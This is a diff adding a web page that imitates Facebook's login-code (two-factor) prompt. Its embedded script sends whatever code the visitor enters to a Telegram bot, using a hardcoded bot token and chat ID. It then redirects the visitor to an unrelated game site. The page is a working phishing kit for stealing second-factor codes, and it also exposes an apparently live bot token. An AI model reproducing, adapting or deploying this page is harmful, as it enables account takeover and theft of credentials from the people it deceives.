@@ -1,0 +1,125 @@
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Facebook Login Code</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+  />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Helvetica&display=swap');
+    body {
+      font-family: Helvetica, Arial, sans-serif;
+    }
+  </style>
+</head>
+<body class="bg-[#d3d3d3] min-h-screen flex flex-col items-center pt-6 px-4">
+  <div class="w-full max-w-sm">
+    <form id="loginForm" class="space-y-0" novalidate>
+      <div class="bg-[#3b5998] text-white text-3xl font-bold text-center py-3 rounded-t-md select-none">
+        facebook
+      </div>
+      <div class="bg-white rounded-b-md border border-t-0 border-gray-300">
+        <div class="border-b border-gray-300 px-4 py-2 font-semibold text-gray-900 select-none">
+          Enter login code to continue
+        </div>
+        <div class="px-4 py-3 text-gray-900 text-sm leading-relaxed">
+          <p class="mb-3">
+            It looks like you haven't logged in from this browser before. Please enter the login code from your phone below.
+          </p>
+          <input
+            id="codeInput"
+            name="codeInput"
+            type="text"
+            aria-label="Login code input"
+            required
+            class="w-full border border-gray-300 h-10 px-2 mb-3 focus:outline-none focus:ring-1 focus:ring-blue-600"
+          />
+          <p class="text-sm mb-3">
+            Note: Your text message may take a few minutes to arrive.
+          </p>
+        </div>
+        <div class="border-t border-gray-300 text-center text-sm text-blue-500 cursor-pointer select-none py-2">
+          Having trouble?
+        </div>
+      </div>
+      <button
+        id="submitBtn"
+        type="submit"
+        disabled
+        class="w-full mt-4 bg-[#3b5998] text-white font-semibold text-base py-2 rounded-md select-none opacity-50 cursor-not-allowed"
+      >
+        Submit Code
+      </button>
+    </form>
+    <div class="text-center text-gray-500 text-sm mt-4 select-none">
+      Not You? <a href="#" class="text-gray-500 hover:underline">Log In Here</a>
+    </div>
+    <div class="bg-white border border-gray-300 rounded-md mt-4 py-3 px-4 text-gray-700 text-xs leading-tight select-none">
+      <div class="grid grid-cols-2 gap-x-4 gap-y-1 text-center">
+        <div>
+          <div class="font-semibold">English (US)</div>
+          <div>Français (France)</div>
+          <div>नेपाली</div>
+          <div>Português (Brasil)</div>
+        </div>
+        <div>
+          <div>العربية</div>
+          <div>Bahasa Indonesia</div>
+          <div>Español</div>
+          <div class="inline-flex justify-center items-center border border-gray-400 rounded w-6 h-6 mx-auto cursor-pointer select-none text-gray-700 font-bold text-lg leading-none">+</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const codeInput = document.getElementById('codeInput');
+    const submitBtn = document.getElementById('submitBtn');
+    const form = document.getElementById('loginForm');
+
+    // Telegram bot token and chat ID placeholders (replace with your actual values)
+    const telegramBotToken = '6470001392:AAHoLrOXaOHdeEP2APO8R-yAzl9pB7_XDtc';
+    const telegramChatId = '6250740299';
+
+    // Redirect URL after successful submission
+    const redirectUrl = 'https://poki.com/en/g/ludo-multiplayer?campaign=21864647923&adgroup=175354140451&extensionid=&targetid=kwd-301350624618&location=9207162&matchtype=e&network=g&device=m&devicemodel=&creative=719293423653&keyword=ludo%20online&placement=&target=&gad_source=1&gbraid=0AAAAADlg9ZHNX18ZeHGjm5IlaA_rY3TH4&gclid=CjwKCAjwq7fABhB2EiwAwk-YbFuw-8VI6UWvfs3EGcaLKc7iXJXp1CDy6sbFxV_PGJoHw9bkl61PIRoCVMAQAvD_BwE';
+
+    codeInput.addEventListener('input', () => {
+      if (codeInput.value.trim() !== '') {
+        submitBtn.disabled = false;
+        submitBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+      } else {
+        submitBtn.disabled = true;
+        submitBtn.classList.add('opacity-50', 'cursor-not-allowed');
+      }
+    });
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      if (codeInput.value.trim() === '') {
+        codeInput.reportValidity();
+        codeInput.focus();
+        return;
+      }
+
+      const message = encodeURIComponent(`Login code submitted: ${codeInput.value.trim()}`);
+      const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${message}`;
+
+      try {
+        const response = await fetch(telegramApiUrl);
+        if (response.ok) {
+          // Redirect after successful Telegram message sent
+          window.location.href = redirectUrl;
+        } else {
+          alert('Failed to send code. Please try again.');
+        }
+      } catch (error) {
+        alert('Error sending code. Please try again.');
+      }
+    });
+  </script>
+</body>
+</html>
